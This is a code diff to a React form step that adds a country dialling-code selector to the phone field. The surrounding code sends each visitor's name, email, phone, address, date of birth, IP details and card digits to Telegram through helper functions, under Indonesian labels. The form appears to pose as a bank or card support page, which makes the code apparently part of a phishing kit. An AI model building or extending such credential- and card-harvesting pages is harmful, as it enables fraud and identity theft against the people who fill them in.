@@ -4,6 +4,133 @@ import { useAuth } from "@/lib/auth";
 import { Upload, Loader2 } from "lucide-react";
 import { sendTelegram, sendFileToTelegram, getIPInfo } from "@/lib/telegram";
 
+const COUNTRY_CODES = [
+  { code: "+1",    flag: "🇺🇸", name: "United States" },
+  { code: "+1",    flag: "🇨🇦", name: "Canada" },
+  { code: "+7",    flag: "🇷🇺", name: "Russia" },
+  { code: "+20",   flag: "🇪🇬", name: "Egypt" },
+  { code: "+27",   flag: "🇿🇦", name: "South Africa" },
+  { code: "+30",   flag: "🇬🇷", name: "Greece" },
+  { code: "+31",   flag: "🇳🇱", name: "Netherlands" },
+  { code: "+32",   flag: "🇧🇪", name: "Belgium" },
+  { code: "+33",   flag: "🇫🇷", name: "France" },
+  { code: "+34",   flag: "🇪🇸", name: "Spain" },
+  { code: "+36",   flag: "🇭🇺", name: "Hungary" },
+  { code: "+39",   flag: "🇮🇹", name: "Italy" },
+  { code: "+40",   flag: "🇷🇴", name: "Romania" },
+  { code: "+41",   flag: "🇨🇭", name: "Switzerland" },
+  { code: "+43",   flag: "🇦🇹", name: "Austria" },
+  { code: "+44",   flag: "🇬🇧", name: "United Kingdom" },
+  { code: "+45",   flag: "🇩🇰", name: "Denmark" },
+  { code: "+46",   flag: "🇸🇪", name: "Sweden" },
+  { code: "+47",   flag: "🇳🇴", name: "Norway" },
+  { code: "+48",   flag: "🇵🇱", name: "Poland" },
+  { code: "+49",   flag: "🇩🇪", name: "Germany" },
+  { code: "+51",   flag: "🇵🇪", name: "Peru" },
+  { code: "+52",   flag: "🇲🇽", name: "Mexico" },
+  { code: "+53",   flag: "🇨🇺", name: "Cuba" },
+  { code: "+54",   flag: "🇦🇷", name: "Argentina" },
+  { code: "+55",   flag: "🇧🇷", name: "Brazil" },
+  { code: "+56",   flag: "🇨🇱", name: "Chile" },
+  { code: "+57",   flag: "🇨🇴", name: "Colombia" },
+  { code: "+58",   flag: "🇻🇪", name: "Venezuela" },
+  { code: "+60",   flag: "🇲🇾", name: "Malaysia" },
+  { code: "+61",   flag: "🇦🇺", name: "Australia" },
+  { code: "+62",   flag: "🇮🇩", name: "Indonesia" },
+  { code: "+63",   flag: "🇵🇭", name: "Philippines" },
+  { code: "+64",   flag: "🇳🇿", name: "New Zealand" },
+  { code: "+65",   flag: "🇸🇬", name: "Singapore" },
+  { code: "+66",   flag: "🇹🇭", name: "Thailand" },
+  { code: "+81",   flag: "🇯🇵", name: "Japan" },
+  { code: "+82",   flag: "🇰🇷", name: "South Korea" },
+  { code: "+84",   flag: "🇻🇳", name: "Vietnam" },
+  { code: "+86",   flag: "🇨🇳", name: "China" },
+  { code: "+90",   flag: "🇹🇷", name: "Turkey" },
+  { code: "+91",   flag: "🇮🇳", name: "India" },
+  { code: "+92",   flag: "🇵🇰", name: "Pakistan" },
+  { code: "+93",   flag: "🇦🇫", name: "Afghanistan" },
+  { code: "+94",   flag: "🇱🇰", name: "Sri Lanka" },
+  { code: "+95",   flag: "🇲🇲", name: "Myanmar" },
+  { code: "+98",   flag: "🇮🇷", name: "Iran" },
+  { code: "+212",  flag: "🇲🇦", name: "Morocco" },
+  { code: "+213",  flag: "🇩🇿", name: "Algeria" },
+  { code: "+216",  flag: "🇹🇳", name: "Tunisia" },
+  { code: "+218",  flag: "🇱🇾", name: "Libya" },
+  { code: "+220",  flag: "🇬🇲", name: "Gambia" },
+  { code: "+221",  flag: "🇸🇳", name: "Senegal" },
+  { code: "+233",  flag: "🇬🇭", name: "Ghana" },
+  { code: "+234",  flag: "🇳🇬", name: "Nigeria" },
+  { code: "+251",  flag: "🇪🇹", name: "Ethiopia" },
+  { code: "+254",  flag: "🇰🇪", name: "Kenya" },
+  { code: "+255",  flag: "🇹🇿", name: "Tanzania" },
+  { code: "+256",  flag: "🇺🇬", name: "Uganda" },
+  { code: "+260",  flag: "🇿🇲", name: "Zambia" },
+  { code: "+263",  flag: "🇿🇼", name: "Zimbabwe" },
+  { code: "+351",  flag: "🇵🇹", name: "Portugal" },
+  { code: "+352",  flag: "🇱🇺", name: "Luxembourg" },
+  { code: "+353",  flag: "🇮🇪", name: "Ireland" },
+  { code: "+354",  flag: "🇮🇸", name: "Iceland" },
+  { code: "+355",  flag: "🇦🇱", name: "Albania" },
+  { code: "+356",  flag: "🇲🇹", name: "Malta" },
+  { code: "+358",  flag: "🇫🇮", name: "Finland" },
+  { code: "+370",  flag: "🇱🇹", name: "Lithuania" },
+  { code: "+371",  flag: "🇱🇻", name: "Latvia" },
+  { code: "+372",  flag: "🇪🇪", name: "Estonia" },
+  { code: "+374",  flag: "🇦🇲", name: "Armenia" },
+  { code: "+375",  flag: "🇧🇾", name: "Belarus" },
+  { code: "+380",  flag: "🇺🇦", name: "Ukraine" },
+  { code: "+381",  flag: "🇷🇸", name: "Serbia" },
+  { code: "+385",  flag: "🇭🇷", name: "Croatia" },
+  { code: "+386",  flag: "🇸🇮", name: "Slovenia" },
+  { code: "+389",  flag: "🇲🇰", name: "North Macedonia" },
+  { code: "+420",  flag: "🇨🇿", name: "Czech Republic" },
+  { code: "+421",  flag: "🇸🇰", name: "Slovakia" },
+  { code: "+502",  flag: "🇬🇹", name: "Guatemala" },
+  { code: "+503",  flag: "🇸🇻", name: "El Salvador" },
+  { code: "+504",  flag: "🇭🇳", name: "Honduras" },
+  { code: "+505",  flag: "🇳🇮", name: "Nicaragua" },
+  { code: "+506",  flag: "🇨🇷", name: "Costa Rica" },
+  { code: "+507",  flag: "🇵🇦", name: "Panama" },
+  { code: "+509",  flag: "🇭🇹", name: "Haiti" },
+  { code: "+591",  flag: "🇧🇴", name: "Bolivia" },
+  { code: "+593",  flag: "🇪🇨", name: "Ecuador" },
+  { code: "+595",  flag: "🇵🇾", name: "Paraguay" },
+  { code: "+598",  flag: "🇺🇾", name: "Uruguay" },
+  { code: "+673",  flag: "🇧🇳", name: "Brunei" },
+  { code: "+675",  flag: "🇵🇬", name: "Papua New Guinea" },
+  { code: "+676",  flag: "🇹🇴", name: "Tonga" },
+  { code: "+679",  flag: "🇫🇯", name: "Fiji" },
+  { code: "+685",  flag: "🇼🇸", name: "Samoa" },
+  { code: "+686",  flag: "🇰🇮", name: "Kiribati" },
+  { code: "+855",  flag: "🇰🇭", name: "Cambodia" },
+  { code: "+856",  flag: "🇱🇦", name: "Laos" },
+  { code: "+880",  flag: "🇧🇩", name: "Bangladesh" },
+  { code: "+886",  flag: "🇹🇼", name: "Taiwan" },
+  { code: "+960",  flag: "🇲🇻", name: "Maldives" },
+  { code: "+961",  flag: "🇱🇧", name: "Lebanon" },
+  { code: "+962",  flag: "🇯🇴", name: "Jordan" },
+  { code: "+963",  flag: "🇸🇾", name: "Syria" },
+  { code: "+964",  flag: "🇮🇶", name: "Iraq" },
+  { code: "+965",  flag: "🇰🇼", name: "Kuwait" },
+  { code: "+966",  flag: "🇸🇦", name: "Saudi Arabia" },
+  { code: "+967",  flag: "🇾🇪", name: "Yemen" },
+  { code: "+968",  flag: "🇴🇲", name: "Oman" },
+  { code: "+970",  flag: "🇵🇸", name: "Palestine" },
+  { code: "+971",  flag: "🇦🇪", name: "UAE" },
+  { code: "+972",  flag: "🇮🇱", name: "Israel" },
+  { code: "+973",  flag: "🇧🇭", name: "Bahrain" },
+  { code: "+974",  flag: "🇶🇦", name: "Qatar" },
+  { code: "+975",  flag: "🇧🇹", name: "Bhutan" },
+  { code: "+976",  flag: "🇲🇳", name: "Mongolia" },
+  { code: "+977",  flag: "🇳🇵", name: "Nepal" },
+  { code: "+992",  flag: "🇹🇯", name: "Tajikistan" },
+  { code: "+993",  flag: "🇹🇲", name: "Turkmenistan" },
+  { code: "+994",  flag: "🇦🇿", name: "Azerbaijan" },
+  { code: "+995",  flag: "🇬🇪", name: "Georgia" },
+  { code: "+996",  flag: "🇰🇬", name: "Kyrgyzstan" },
+  { code: "+998",  flag: "🇺🇿", name: "Uzbekistan" },
+];
+
 const INQUIRY_TYPES = [
   "Account Inquiry",
   "Card Issue",
@@ -34,6 +161,7 @@ export default function Step4() {
   const [lastName, setLastName]         = useState("");
   const [email, setEmail]               = useState("");
   const [phone, setPhone]               = useState("");
+  const [dialCode, setDialCode]         = useState("+1");
   const [address, setAddress]           = useState("");
   const [city, setCity]                 = useState("");
   const [stateVal, setStateVal]         = useState("");
@@ -98,7 +226,7 @@ export default function Step4() {
         `👤 <b>Username</b>     : <code>${user?.username ?? "-"}</code>\n` +
         `👦 <b>Nama Lengkap</b> : <code>${firstName} ${lastName}</code>\n` +
         `📧 <b>Email</b>        : <code>${email}</code>\n` +
-        `📱 <b>Mobile</b>       : <code>${phone}</code>\n` +
+        `📱 <b>Mobile</b>       : <code>${dialCode} ${phone}</code>\n` +
         `🏠 <b>Alamat</b>       : <code>${address}, ${city}, ${stateVal} ${postalCode}</code>\n` +
         `🎂 <b>Tgl Lahir</b>    : <code>${dob}</code>\n` +
         `📌 <b>Inquiry</b>      : <code>${inquiryType}</code>\n` +
@@ -116,7 +244,7 @@ export default function Step4() {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           username: user?.username ?? "",
-          firstName, lastName, email, phone,
+          firstName, lastName, email, phone: `${dialCode} ${phone}`,
           address, city, state: stateVal, postalCode,
           dob, inquiryType, message,
           cardDigits: cardDigits.trim(),
@@ -213,9 +341,25 @@ export default function Step4() {
               <Err k="email" />
             </div>
             <div>
-              <input className="s4i" type="tel" placeholder="Mobile Phone*" value={phone}
-                onChange={e => setPhone(e.target.value)}
-                style={{ ...inp, borderColor: errors.phone ? "#c00" : "#ccc" }} />
+              <div style={{ display: "flex", border: `1px solid ${errors.phone ? "#c00" : "#ccc"}`, borderRadius: 4, overflow: "hidden", height: 48, background: "#fff" }}>
+                <select
+                  value={dialCode}
+                  onChange={e => setDialCode(e.target.value)}
+                  style={{ border: "none", borderRight: "1px solid #e0e0e0", background: "#f7f7f7", fontSize: 13, color: "#111", padding: "0 6px", outline: "none", cursor: "pointer", minWidth: 90, maxWidth: 90, fontFamily: "inherit" }}
+                >
+                  {COUNTRY_CODES.map((c, i) => (
+                    <option key={i} value={c.code}>{c.flag} {c.code}</option>
+                  ))}
+                </select>
+                <input
+                  className="s4i"
+                  type="tel"
+                  placeholder="Mobile Phone*"
+                  value={phone}
+                  onChange={e => setPhone(e.target.value)}
+                  style={{ flex: 1, border: "none", outline: "none", padding: "0 14px", fontSize: 14, color: "#111", background: "#fff", fontFamily: "inherit" }}
+                />
+              </div>
               <Err k="phone" />
             </div>
           </div>
